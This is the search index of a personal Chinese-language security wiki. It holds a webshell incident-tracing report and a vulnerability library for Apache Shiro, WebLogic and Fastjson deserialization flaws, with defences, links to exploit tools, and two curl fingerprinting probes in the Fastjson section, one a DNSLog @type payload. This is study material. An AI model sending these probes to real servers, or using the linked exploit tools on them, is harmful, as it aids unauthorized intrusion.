{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"hack for security \u00b6 \u7ad9\u70b9\u542f\u75282022\u5e74\uff0c\u8bb0\u5f55\u81ea\u5df1\u7ea2\u84dd\u65b9\u5411\u5b66\u4e60\u77e5\u8bc6 red-team \u00b6 mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit. blue-team \u00b6 1 2 3 4 mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files. tools \u00b6","title":"\u4e3b\u9875"},{"location":"#hack-for-security","text":"\u7ad9\u70b9\u542f\u75282022\u5e74\uff0c\u8bb0\u5f55\u81ea\u5df1\u7ea2\u84dd\u65b9\u5411\u5b66\u4e60\u77e5\u8bc6","title":"hack for security"},{"location":"#red-team","text":"mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit.","title":"red-team"},{"location":"#blue-team","text":"1 2 3 4 mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"blue-team"},{"location":"#tools","text":"","title":"tools"},{"location":"tags/","text":"","title":"Tags"},{"location":"about/aboutme/","text":"hi\uff0c\u5f88\u9ad8\u5174\u80fd\u9047\u5230\u5fd7\u540c\u9053\u5408\u7684\u670b\u53cb\uff0c\u6211\u53eb\u5706\u5468 2022\u5e74\u505a\u4e86\u5f88\u591a\u4e8b\uff0c\u7531\u4e8e\u4e4b\u524d\u5728\u535a\u5ba2\u56ed\u548ccsdn\u88ab\u5220\u9664\u4e86\u5f88\u591a\u6587\u7ae0\uff0c\u6211\u8003\u8651\u8f6c\u5230github\u4e0a\u505a\u81ea\u5df1\u7684wiki\u77e5\u8bc6\u5e93\uff0c\u4e3b\u8981\u5185\u5bb9\u662f\u8bb0\u5f55\u81ea\u5df1\u7684\u6280\u80fd\u6811\u65b9\u5411 \u672c\u7ad9\u7531mkdocs\u548cgithub\u642d\u5efa\uff0c\u53ef\u4ee5\u53c2\u8003\u63d2\u4ef6 \u4e3b\u9898 \u9009\u62e9\u5408\u9002\u7684\u4e3b\u9898 \u914d\u7f6e\u76f8\u5173 material","title":"about me"},{"location":"blueteam/%E8%93%9D%E9%98%9F%E7%9B%AE%E5%BD%95/","text":"11","title":"\u76ee\u5f55"},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","text":"\u4fe1\u606f\u6536\u96c6 whois\u67e5\u8be2 \u6536\u96c6\u5b50\u57df\u540d \u7aef\u53e3\u626b\u63cf \u67e5\u627e\u771f\u5b9eip \u63a2\u6d4b\u65c1\u7ad9\u53caC\u6bb5 \u7f51\u7edc\u7a7a\u95f4\u641c\u7d22\u5f15\u64ce \u626b\u63cf\u654f\u611f\u76ee\u5f55/\u6587\u4ef6 \u6307\u7eb9\u8bc6\u522b \u975e\u5e38\u89c4\u64cd\u4f5c \u00b6 SSL/TLS\u8bc1\u4e66\u67e5\u8be2 \u00b6 \u00b6","title":"\u4fe1\u606f\u6536\u96c6"},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_1","text":"","title":"\u975e\u5e38\u89c4\u64cd\u4f5c"},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#ssltls","text":"","title":"SSL/TLS\u8bc1\u4e66\u67e5\u8be2"},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_2","text":"","title":""},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/","text":"\u6eaf\u6e90\u5206\u6790 \u00b6 \u653b\u51fb\u8005\u753b\u50cf\uff1a\u53d1\u73b0\u5229\u7528\u51b0\u874eWebshell\u5de5\u5177\u8fde\u63a5\u540e\u95e8 \u00b6 \u4e00\u3001\u4e8b\u4ef6\u63cf\u8ff0 \u00b6 \u53d1\u73b0\u653b\u51fb\u8005\u5c1d\u8bd5\u7528\u51b0\u874eWebshell\u5de5\u5177\u8fde\u63a5\u540e\u95e8\u3002\u51b0\u874e\u662f\u4e00\u6b3e\u4f7f\u7528\u52a0\u5bc6\u65b9\u5f0f\u8fde\u63a5\u540e\u95e8\u7a0b\u5e8f\u7684\u5ba2\u6237\u7aef\u5de5\u5177\u3002\u653b\u51fb\u8005\u6b63\u5728\u8fde\u63a5\u5e76\u8bbf\u95ee\u540e\u95e8\u7a0b\u5e8f\u3002 \u53d7\u5bb3\u4e3b\u673a\u53ef\u80fd\u5df2\u7ecf\u88ab\u690d\u5165\u540e\u95e8\u3001\u8fdc\u63a7\u6216\u6728\u9a6c\uff0c\u5bfc\u81f4\u53d7\u5bb3\u4e3b\u673a\u5df2\u7ecf\u6ca6\u9677\uff0c\u6210\u4e3a\u5080\u5121\u673a\u3002 \u4e8c\u3001\u884c\u4e3a\u5206\u6790 \u00b6 \u901a\u8fc7\u5bf9\u4f20\u8f93\u7684\u6570\u636e\u5305\u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0\u4ee5\u4e0b1\u4e2a\u8d26\u53f7\u5b58\u5728\u5f31\u53e3\u4ee4\u767b\u5f55\u884c\u4e3a\u3002\u5929\u773c\u544a\u8b66\u4e2d\u53d1\u73b0\u5229\u7528\u51b0\u874eWebshell\u5de5\u5177\u8fde\u63a5\u540e\u95e8\u544a\u8b66 \u7ecf\u8fc7\u5929\u773c\u544a\u8b66\u5206\u6790\uff0c\u53d1\u73b0\u4ee5\u4e0b\u4e24\u4e2a\u7f51\u7ad9\u5b58\u5728\u51b0\u874e\u540e\u95e8\uff1a xxx.xxx.org xxx.xxx.xxx.org:8080 \u5176\u4e2dxxx.xxx.org\u7684webshell\u5730\u5740\u4e3a\uff1a xxx.xxx.org/apk/14/hf1t.jsp xxx.xxx.xxx.org:8080\u7684webshell\u5730\u5740\u4e3a\uff1a xxx.xxx.xxx.org:8080/gd_interface/shell.jsp \u67e5\u8be2\u5929\u773c\u65e5\u5fd7\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4e8e9\u670812\u65e5\u5bf9xxx.xxx.org\u4e0a\u4f20webshell\uff0c\u5e76\u6301\u7eed\u53d1\u8d77\u8fde\u63a5\u3002 \u8be5\u653b\u51fb\u8005\u66fe\u53d1\u8d77\u591a\u79cd\u653b\u51fb\u884c\u4e3a\uff0c\u6839\u636e\u544a\u8b66\u5206\u6790\u521d\u6b65\u63a8\u6d4b\u4e3a\u4f7f\u7528SQL\u6ce8\u5165\u8fdb\u5165\u7ba1\u7406\u540e\u53f0\u3002 \u5173\u8054\u5929\u773c\u544a\u8b66\u5206\u6790\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4e8e9\u670812\u65e519\u65f6\u901a\u8fc7xxx.xxx.xxxx.org:8080/ajaxinvoke/frameworkModuleJob.processApkUpload.upload\u9875\u9762\u6210\u529f\u4e0a\u4f20webshell \u67e5\u770bxxx.xxx.xxx.org:8080\u76f8\u5173\u544a\u8b66\uff0c\u672a\u53d1\u73b0\u5176\u4ed6\u653b\u51fb\u884c\u4e3a\uff0c\u63a8\u6d4b\u4e3a\u5929\u773c\u4e0a\u67b6\u524d\u5df2\u88ab\u690d\u5165\u540e\u95e8\u3002 \u67e5\u770b\u5929\u773c\u76f8\u5173\u65e5\u5fd7\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4e8e9\u670815\u65e5\u8fdb\u884c\u8fde\u63a5\u540e\u95e8\u64cd\u4f5c\uff0c\u4e14\u672a\u8fdb\u884c\u5176\u4ed6\u7f51\u7edc\u4ea4\u4e92\u3002 \u4e09\u3001\u5f71\u54cd\u5206\u6790 \u00b6 \u653b\u51fbIP\u5217\u8868 \u00b6 10.2.84.115 \u53d7\u5bb3IP\u5217\u8868 \u00b6 10.2.84.115 \u56db\u3001\u5904\u7f6e\u5efa\u8bae \u00b6 \u53ca\u65f6\u6e05\u9664\u53d1\u73b0\u7684 webshell \u540e\u95e8\u3001\u6076\u610f\u6728\u9a6c\u6587\u4ef6\u3001\u6316\u77ff\u7a0b\u5e8f\u3002\u5728\u4e0d\u5f71\u54cd\u7cfb\u7edf\u6b63\u5e38\u8fd0\u884c\u7684\u524d\u63d0\u4e0b\uff0c\u5efa\u8bae\u91cd\u65b0\u5b89\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5e76\u91cd\u65b0\u90e8\u7f72\u5e94\u7528\uff0c\u4ee5\u4fdd\u8bc1\u6076\u610f\u7a0b\u5e8f\u88ab\u5f7b\u5e95\u6e05\u7406\u3002","title":"\u6eaf\u6e90\u5206\u6790"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#_1","text":"","title":"\u6eaf\u6e90\u5206\u6790"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#webshell","text":"","title":"\u653b\u51fb\u8005\u753b\u50cf\uff1a\u53d1\u73b0\u5229\u7528\u51b0\u874eWebshell\u5de5\u5177\u8fde\u63a5\u540e\u95e8"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#_2","text":"\u53d1\u73b0\u653b\u51fb\u8005\u5c1d\u8bd5\u7528\u51b0\u874eWebshell\u5de5\u5177\u8fde\u63a5\u540e\u95e8\u3002\u51b0\u874e\u662f\u4e00\u6b3e\u4f7f\u7528\u52a0\u5bc6\u65b9\u5f0f\u8fde\u63a5\u540e\u95e8\u7a0b\u5e8f\u7684\u5ba2\u6237\u7aef\u5de5\u5177\u3002\u653b\u51fb\u8005\u6b63\u5728\u8fde\u63a5\u5e76\u8bbf\u95ee\u540e\u95e8\u7a0b\u5e8f\u3002 \u53d7\u5bb3\u4e3b\u673a\u53ef\u80fd\u5df2\u7ecf\u88ab\u690d\u5165\u540e\u95e8\u3001\u8fdc\u63a7\u6216\u6728\u9a6c\uff0c\u5bfc\u81f4\u53d7\u5bb3\u4e3b\u673a\u5df2\u7ecf\u6ca6\u9677\uff0c\u6210\u4e3a\u5080\u5121\u673a\u3002","title":"\u4e00\u3001\u4e8b\u4ef6\u63cf\u8ff0"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#_3","text":"\u901a\u8fc7\u5bf9\u4f20\u8f93\u7684\u6570\u636e\u5305\u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0\u4ee5\u4e0b1\u4e2a\u8d26\u53f7\u5b58\u5728\u5f31\u53e3\u4ee4\u767b\u5f55\u884c\u4e3a\u3002\u5929\u773c\u544a\u8b66\u4e2d\u53d1\u73b0\u5229\u7528\u51b0\u874eWebshell\u5de5\u5177\u8fde\u63a5\u540e\u95e8\u544a\u8b66 \u7ecf\u8fc7\u5929\u773c\u544a\u8b66\u5206\u6790\uff0c\u53d1\u73b0\u4ee5\u4e0b\u4e24\u4e2a\u7f51\u7ad9\u5b58\u5728\u51b0\u874e\u540e\u95e8\uff1a xxx.xxx.org xxx.xxx.xxx.org:8080 \u5176\u4e2dxxx.xxx.org\u7684webshell\u5730\u5740\u4e3a\uff1a xxx.xxx.org/apk/14/hf1t.jsp xxx.xxx.xxx.org:8080\u7684webshell\u5730\u5740\u4e3a\uff1a xxx.xxx.xxx.org:8080/gd_interface/shell.jsp \u67e5\u8be2\u5929\u773c\u65e5\u5fd7\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4e8e9\u670812\u65e5\u5bf9xxx.xxx.org\u4e0a\u4f20webshell\uff0c\u5e76\u6301\u7eed\u53d1\u8d77\u8fde\u63a5\u3002 \u8be5\u653b\u51fb\u8005\u66fe\u53d1\u8d77\u591a\u79cd\u653b\u51fb\u884c\u4e3a\uff0c\u6839\u636e\u544a\u8b66\u5206\u6790\u521d\u6b65\u63a8\u6d4b\u4e3a\u4f7f\u7528SQL\u6ce8\u5165\u8fdb\u5165\u7ba1\u7406\u540e\u53f0\u3002 \u5173\u8054\u5929\u773c\u544a\u8b66\u5206\u6790\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4e8e9\u670812\u65e519\u65f6\u901a\u8fc7xxx.xxx.xxxx.org:8080/ajaxinvoke/frameworkModuleJob.processApkUpload.upload\u9875\u9762\u6210\u529f\u4e0a\u4f20webshell \u67e5\u770bxxx.xxx.xxx.org:8080\u76f8\u5173\u544a\u8b66\uff0c\u672a\u53d1\u73b0\u5176\u4ed6\u653b\u51fb\u884c\u4e3a\uff0c\u63a8\u6d4b\u4e3a\u5929\u773c\u4e0a\u67b6\u524d\u5df2\u88ab\u690d\u5165\u540e\u95e8\u3002 \u67e5\u770b\u5929\u773c\u76f8\u5173\u65e5\u5fd7\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4e8e9\u670815\u65e5\u8fdb\u884c\u8fde\u63a5\u540e\u95e8\u64cd\u4f5c\uff0c\u4e14\u672a\u8fdb\u884c\u5176\u4ed6\u7f51\u7edc\u4ea4\u4e92\u3002","title":"\u4e8c\u3001\u884c\u4e3a\u5206\u6790"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#_4","text":"","title":"\u4e09\u3001\u5f71\u54cd\u5206\u6790"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#ip","text":"10.2.84.115","title":"\u653b\u51fbIP\u5217\u8868"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#ip_1","text":"10.2.84.115","title":"\u53d7\u5bb3IP\u5217\u8868"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#_5","text":"\u53ca\u65f6\u6e05\u9664\u53d1\u73b0\u7684 webshell \u540e\u95e8\u3001\u6076\u610f\u6728\u9a6c\u6587\u4ef6\u3001\u6316\u77ff\u7a0b\u5e8f\u3002\u5728\u4e0d\u5f71\u54cd\u7cfb\u7edf\u6b63\u5e38\u8fd0\u884c\u7684\u524d\u63d0\u4e0b\uff0c\u5efa\u8bae\u91cd\u65b0\u5b89\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5e76\u91cd\u65b0\u90e8\u7f72\u5e94\u7528\uff0c\u4ee5\u4fdd\u8bc1\u6076\u610f\u7a0b\u5e8f\u88ab\u5f7b\u5e95\u6e05\u7406\u3002","title":"\u56db\u3001\u5904\u7f6e\u5efa\u8bae"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/","text":"\u65e5\u5e38exp shiro\u7c7b \u00b6 Apache shiro \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u00b6 Shiro-550, Shiro-721 \u6f0f\u6d1e\u7b80\u4ecb Apache Shiro\u662f\u4e00\u4e2a\u5f3a\u5927\u4e14\u6613\u7528\u7684Java\u5b89\u5168\u6846\u67b6,\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u3001\u6388\u6743\u3001\u5bc6\u7801\u548c \u4f1a\u8bdd\u7ba1\u7406\u3002 \u5f71\u54cd\u8303\u56f4 Apache Shiro <= 1.2.4 \u5982 \u679c shiro \u7684 rememberMe \u529f \u80fd \u7684 AES \u5bc6 \u94a5 \u88ab \u6cc4 \u9732 , \u5c31\u4f1a\u5bfc\u81f4\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u65e0\u8bbaShiro\u662f\u4ec0\u4e48\u7248\u672c\u3002 \u6f0f\u6d1e\u7279\u5f81 set-Cookie: rememberMe=deleteMe\u6216\u8005URL\u4e2d\u6709shiro\u5b57\u6837\uff0c\u6709\u4e00\u4e9b\u65f6\u5019\u670d\u52a1\u5668 \u4e0d\u4f1a\u4e3b\u52a8\u8fd4\u56de rememberMe=deleteMe\u76f4\u63a5\u53d1\u5305\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 Shiro RememberMe 1.2.4 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u8be6\u7ec6\u590d\u73b0 https://www.cnblogs.com/paperpen/p/11312671.html Shiro\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u6c47\u603b\uff08Shiro-550+Shiro-721\uff09 https://www.cnblogs.com/xiaozi/p/13239046.html Shiro RememberMe 1.2.4\u53cd\u5e8f\u5217\u5316\u5bfc\u81f4\u7684\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e https://paper.seebug.org/shiro-rememberme-1-2-4/#0x01 Shiro RememberMe 1.2.4 \u53cd \u5e8f \u5217 \u5316 \u6f0f \u6d1e (Shiro-550, CVE-2016- 4437)\u590d\u73b0 https://blog.csdn.net/qq_43645782/article/details/106028873 Shiro 721 Padding Oracle\u653b\u51fb\u6f0f\u6d1e\u5206\u6790 https://www.anquanke.com/post/id/193165 \u5229\u7528\u5de5\u5177 ShiroExploit https://github.com/feihong-cs/ShiroExploit Shiro_exploit https://github.com/insightglacier/Shiro_exploit/blob/master/shiro_ex ploit.py \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7Shiro\u5230\u6700\u65b0\u7248\u5347\u7ea7\u5bf9\u5e94JDK\u7248\u672c\u5230 8u191/7u201/6u211/11.0.1 \u4ee5\u4e0aWAF\u62e6\u622aCookie\u4e2d\u957f\u5ea6\u8fc7\u5927\u7684rememberMe\u503c Apache Shiro \u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e (Shiro-682) \u6f0f\u6d1e\u7b80\u4ecb \u6f0f \u6d1e \u521d \u59cb \u6210 \u56e0 \u53ef \u4ee5 \u5b9a \u4f4d \u5230 PathMatchingFilterChainResolver\u7684getChain\u51fd\u6570\u4e0b\uff0c\u8be5\u51fd\u6570\u4f5c\u7528\u6839 \u636eURL\u8def\u5f84\u5339\u914d\u4e2d\u914d\u7f6e\u7684url\u8def\u5f84\u8868\u8fbe\u5f0f\u6765\u5339\u914d\u8f93\u5165\u7684URL\uff0c\u5224\u65ad\u662f\u5426 \u5339\u914d\u62e6\u622a\u5668\uff0c\u5339\u914d\u6210\u529f\u5c06\u4f1a\u8fd4\u56de\u54cd\u5e94\u7684\u62e6\u622a\u5668\u6267\u884c\u94fe\uff0c\u8ba9ShiroFither\u6267 \u884c\u6743\u9650\u64cd\u4f5c\u3002 \u5f71\u54cd\u8303\u56f4 Apache Shiro < 1.5.2 \u6f0f\u6d1e\u7279\u5f81 set-Cookie: rememberMe=deleteMe\u6216\u8005URL\u4e2d\u6709shiro\u5b57\u6837\uff0c\u6709\u4e00\u4e9b\u65f6\u5019\u670d\u52a1\u5668 \u4e0d\u4f1a\u4e3b\u52a8\u8fd4\u56de rememberMe=deleteMe \u76f4\u63a5\u53d1\u5305\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 Shiro\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\u5206\u6790\uff08CVE-2020-1957\uff09 https://www.freebuf.com/vuls/231909.html \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea71.5.2\u7248\u672c\u53ca\u4ee5\u4e0a\u5c3d\u91cf\u907f\u514d\u4f7f\u7528\u901a\u914d\u7b26\u4f5c\u4e3a\u52a8\u6001\u8def\u7531\u62e6\u622a\u5668\u7684URL \u8def\u5f84\u8868\u8fbe\u5f0f. weblogic\u76f8\u5173 \u00b6 Weblogic T3 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Weblogic Server \u4e2d \u7684 RMI \u901a \u4fe1 \u4f7f \u7528 T3 \u534f \u8bae \u5728 Weblogic Server \u548c \u5176 \u5b83 Java \u7a0b \u5e8f \uff08 \u5ba2 \u6237 \u7aef \u6216 \u8005 \u5176 \u5b83 Weblogic Server \u5b9e \u4f8b \uff09 \u4e4b \u95f4 \u4f20 \u8f93 \u6570 \u636e , \u670d\u52a1\u5668\u5b9e\u4f8b\u4f1a\u8ddf\u8e2a\u8fde\u63a5\u5230\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u4e2aJava \u865a\u62df\u673a\uff08JVM \uff09\u4e2d, \u5e76 \u521b \u5efa T3 \u534f \u8bae \u901a \u4fe1 \u8fde \u63a5 , \u5c06 \u6d41 \u91cf \u4f20 \u8f93 \u5230 Java \u865a \u62df \u673a . T3 \u534f \u8bae \u5728 \u5f00 \u653e WebLogic \u63a7 \u5236 \u53f0 \u7aef \u53e3 \u7684 \u5e94 \u7528 \u4e0a \u9ed8 \u8ba4 \u5f00 \u542f . \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7T3\u534f\u8bae\u53d1\u9001\u6076\u610f\u7684\u7684\u53cd\u5e8f\u5217\u5316\u6570\u636e, \u8fdb\u884c\u53cd\u5e8f\u5217\u5316, \u5b9e\u73b0\u5bf9\u5b58\u5728\u6f0f\u6d1e\u7684weblogic\u7ec4\u4ef6\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u653b\u51fb. \u5f71\u54cd\u8303\u56f4 Weblogic 10.3.6.0.0 Weblogic 12.1.3.0.0 Weblogic 12.2.1.3.0 \u6f0f\u6d1e\u7279\u5f81 \u53ef\u4ee5\u6839\u636eweblogic\u7684\u62a5\u9519\u9875\u9762\u4f5c\u4e3a\u7279\u5f81\uff1a The server has not found anything matching the Request-URI.No indication is given of whether the condition is temporary or permanent.\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 \u6f0f\u6d1e\u590d\u73b0 Weblogic t3\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e(CVE-2019-2890)\u5206\u6790 http://gv7.me/articles/2019/cve-2019-2890-vulnerability-analysis/ Weblogic T3\u534f\u8bae\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2018-2628\uff09 https://blog.csdn.net/Aaron_Miller/article/details/106657746 \u76f8\u5173\u6f0f\u6d1e\u5305\u62ec\uff1a CVE-2017-3248 https://paper.seebug.org/333/ CVE-2018-2628 https://paper.seebug.org/985/ CVE-2018-2893 https://www.freebuf.com/vuls/178105.html CVE-2019-2890 https://paper.seebug.org/1069/ CVE-2020-2555(Oracle Coherence) https://paper.seebug.org/1141/ \u5229\u7528\u5de5\u5177 weblogic \u6f0f\u6d1e\u626b\u63cf\u5de5\u5177 https://github.com/0xn0ne/weblogicScanner \u9632\u62a4\u65b9\u6cd5 \u53ca \u65f6 \u66f4 \u65b0 \u8865 \u4e01 \u7981 \u7528 T3 \u534f \u8bae \u7981 \u6b62 T3 \u7aef \u53e3 \u5bf9 \u5916 \u5f00 \u653e , \u6216\u8005\u9650\u5236\u53ef\u8bbf\u95eeT3\u7aef\u53e3\u7684IP\u6765\u6e90 Weblogic XMLDecoder\u53cd\u5e8f\u5217\u5316 \u6f0f\u6d1e\u7b80\u4ecb WebLogic \u4e2d \u9ed8 \u8ba4 \u5305 \u542b \u7684 wls-wast \u4e0e wls9_async_response war \u5305 \uff0c \u7531 \u4e8e \u4ee5 \u4e0a WAR \u5305 \u91c7 \u7528 XMLDecoder \u53cd \u5e8f \u5217 \u5316 \u673a \u5236 \u6765 \u5904 \u7406 \u53d1 \u9001 \u8fc7 \u6765 \u7684 XML \u6570 \u636e \uff0c \u8fdc \u7a0b \u6076 \u610f \u653b \u51fb \u8005 \u53ef \u4ee5 \u901a \u8fc7 \u53d1 \u9001 \u7cbe \u5fc3 \u6784 \u9020 \u7684 HTTP \u8bf7\u6c42\uff0c\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\uff0c\u83b7\u5f97\u76ee\u6807\u670d\u52a1\u5668\u7684\u6743\u9650\u3002\u4e5f\u5c31 \u662f\u8bf4\uff0c\u653b\u51fb\u8005\u80fd\u591f\u76f4\u63a5\u83b7\u53d6\u670d\u52a1\u5668\u7cfb\u7edf\u6743\u9650\uff0c\u8fdb\u884c\u6570\u636e\u7a83\u53d6\uff0c\u8fdb\u800c\u751a\u81f3 \u4f1a\u5a01\u80c1\u53d7\u5bb3\u8005\u7684\u5185\u7f51\u5b89\u5168\u3002 \u5f71\u54cd\u8303\u56f4 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.1.0 Oracle WebLogic Server12.2.1.3.0 \u6f0f\u6d1e\u7279\u5f81 /wls-wsat/CoordinatorPortType /async/AsyncResponseService /async/AsyncResponseServiceSoap12 \u6f0f\u6d1e\u590d\u73b0 WebLogic XMLDecoder\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2017-10271\uff09 https://blog.csdn.net/u013622866/article/details/104872747 WebLogic-XMLDecoder\u53cd\u5e8f\u5217\u5316\u5206\u6790 https://hu3sky.github.io/2019/10/16/weblogic/ \u5229\u7528\u5de5\u5177 weblogicScanner https://github.com/0xn0ne/weblogicScanner \u9632\u62a4\u65b9\u6cd5 \u901a\u8fc7\u8bbf\u95ee\u7b56\u7565\u63a7\u5236\u7981\u6b62\u5916\u90e8/_async/* \u53ca /wls-wsat/*\u8def\u5f84\u7684URL\u8bbf\u95ee \u5220\u9664\u5bf9\u5e94war\u5305\u5e76\u91cd\u542f webLogic \u9650\u5236\u6e90IP\u5bf9\u5e94 weblogic 7001\u7aef\u53e3\u7684\u8bbf\u95ee Fastjson\u53cd\u5e8f\u5217\u5316 \u00b6 Fastjson 1.2.22 - 1.2.24 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u7b80\u4ecb FastJson\u662falibaba\u7684\u4e00\u6b3e\u5f00\u6e90JSON\u89e3\u6790\u5e93\uff0c\u53ef\u7528\u4e8e\u5c06Java\u5bf9\u8c61\u8f6c\u6362 \u4e3a\u5176JSON\u8868\u793a\u5f62\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u5c06JSON\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u7b49\u6548\u7684Java\u5bf9 \u8c61\u3002fastjson\u5728\u89e3\u6790json\u7684\u8fc7\u7a0b\u4e2d\uff0c\u652f\u6301\u4f7f\u7528autoType\u6765\u5b9e\u4f8b\u5316\u67d0\u4e00\u4e2a \u5177 \u4f53 \u7684 \u7c7b \uff0c \u5e76 \u8c03 \u7528 \u8be5 \u7c7b \u7684 set/get \u65b9 \u6cd5 \u6765 \u8bbf \u95ee \u5c5e \u6027 \u3002 \u5728 Java 8u102\u73af\u5883\u4e0b\uff0c\u6ca1\u6709com.sun.jndi.rmi.object.trustURLCodebase\u7684\u9650 \u5236\uff0c\u53ef\u4ee5\u4f7f\u7528com.sun.rowset.JdbcRowSetImpl\u7684\u5229\u7528\u94fe\uff0c\u501f\u52a9JNDI \u6ce8\u5165\u6765\u6267\u884c\u547d\u4ee4\u3002 \u5f71\u54cd\u8303\u56f4 Fastjson 1.2.22 - 1.2.24 \u6f0f\u6d1e\u7279\u5f81 \u5982\u679c\u7ad9\u70b9\u6709\u539f\u59cb\u62a5\u9519\u56de\u663e\uff0c\u53ef\u4ee5\u7528\u4e0d\u95ed\u5408\u82b1\u62ec\u53f7\u7684\u65b9\u5f0f\u8fdb\u884c\u62a5\u9519\u56de\u663e\uff0c \u62a5 \u9519 \u4e2d \u5f80 \u5f80 \u4f1a \u6709 fastjson \u7684 \u5b57 \u6837 .(vulhub \u73af \u5883 \u4e0d \u9002 \u7528 \uff09 \u3002 curl http://10.154.7.128:8090/ -H \"Content-Type: application/json\" --data '{\"name\":\"success\", \"age\":20' \u53ef \u4ee5 \u901a \u8fc7 DNS \u56de \u663e \u7684 \u65b9 \u5f0f \u68c0 \u6d4b \u540e \u7aef \u662f \u5426 \u4f7f \u7528 Fastjson \u3002 curl http://10.154.7.128:8090/ -H \"Content-Type: application/json\" --data '{{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:0' Java \u7cfb Json \u5904\u7406\u57fa\u672c\u53ea\u6709 Fastjson \u548c Jackson\uff0c\u8ffd\u52a0\u4e00\u4e2a\u968f\u673a key\u65f6jackson\u4f1a\u62a5\u9519\u3002 \u5bf9 \u4f7f \u7528 fastjson \u7684 \u3002 Fastjson < 1.2.60 \u5728 \u53d6 \u4e0d \u5230 \u503c \u7684 \u65f6 \u5019 \u4f1a \u586b \u5145 \\u001a , \u5728 1.2.60 \u8fdb \u884c \u4e86 \u4fee \u590d , \u5bf9 \\x \u540e \u9762 \u7684 \u5b57 \u7b26 \u8fdb \u884c \u662f \u5426 \u4e3a 16 \u8fdb \u5236 \u5141 \u8bb8 \u5b57 \u7b26 (0-9a-fA-F) \u7684\u6821\u9a8c,\u6240\u4ee5\u8fd9\u91cc\u5c31\u53ef\u4ee5\u624b\u52a8 padding ,\u6784\u9020\u4e00\u4e2a\u7279\u6b8a\u7684\u5b57\u7b26\u4e32\u3002 \u6f0f\u6d1e\u590d\u73b0 fastjson <= 1.2.24 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790 https://www.secpulse.com/archives/73508.html fastjson 1.2.24\u53cd\u5e8f\u5217\u5316\u5bfc\u81f4\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5206\u6790\u8bb0\u5f55 https://www.cnblogs.com/tr1ple/p/11431543.html fastjson 1.2.24\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u6df1\u5ea6\u5206\u6790 https://www.anquanke.com/post/id/211035 \u5982\u4f55\u5229\u7528 https://mntn0x.github.io/2020/04/07/Fastjson%E6%BC%8F%E6%B 4%9E%E5%A4%8D%E7%8E%B0/ \u9632\u62a4\u65b9\u6cd5 